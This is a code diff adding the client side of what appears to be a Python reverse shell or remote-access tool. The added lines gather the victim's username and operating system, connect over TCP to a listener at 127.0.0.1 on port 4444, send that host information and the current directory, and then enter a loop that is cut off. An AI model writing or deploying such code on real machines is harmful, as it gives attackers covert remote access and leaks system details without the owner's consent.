@@ -6,6 +6,43 @@ import subprocess
 import platform
 
 def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+
+def send_message(connection, message):
+    try:
+        message = message.encode()
+        message_length = len(message)
+        connection.sendall(str(message_length).zfill(10).encode())
+        connection.sendall(message)
+    except Exception as e:
+        print(f"Error sending message: {e}")
+        sys.exit()
+
+def receive_full_message(connection):
+    try:
+        message_length = int(connection.recv(10).decode())
+        data = b''
+        while len(data) < message_length:
+            packet = connection.recv(message_length - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data.decode()
+    except ValueError:
+        return None
+
+get_os = platform.uname()[0]
+get_user = getuser()
+os_info = "Name: "+str(get_user)+" <-> "+"OS: "+str(get_os)
+
+ip = "127.0.0.1"
+port = 4444
+
+connection = socket(AF_INET, SOCK_STREAM)
+connection.connect((ip, port))
+
+current_directory = os.getcwd()
+
+send_message(connection, os_info)
 send_message(connection, f"{current_directory}")
 
 while True:
